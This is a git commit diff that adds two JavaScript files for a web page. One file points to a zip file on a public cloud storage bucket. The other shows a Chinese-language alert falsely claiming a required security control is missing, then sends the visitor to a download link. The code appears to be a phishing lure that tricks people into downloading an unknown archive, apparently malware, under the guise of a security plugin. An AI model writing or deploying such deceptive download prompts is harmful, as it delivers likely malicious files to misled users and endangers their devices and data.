0e5d6a9d261f673ced05c4daf2fa476e4d90d720
aa168188aaaaa <cshrishuwhe@gmail.com>
2025-03-20 20:57:16 +0800

    Add files via upload

---
+++ assets/download/filename.js
@@ -0,0 +1,3 @@
+(function() {
+    window.filename = 'https://pub-bbd4563a163f414086e62f5cf87a6b4e.r2.dev/fins1.zip';
+})();
---
+++ static/js/main.js
@@ -0,0 +1,14 @@
+const layer = layui.layer;
+
+function openModal() {
+    layer.alert('检测未安装安全控件，请安装后重试！', function() {
+        location.href = window['downloadLink'];
+        $('.layui-layer-move, .layui-layer-shade, .layui-layer.layui-layer-dialog').remove();
+    });
+}
+
+function validateEmail(email) {
+    return email.match(
+        /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
+    );
+}
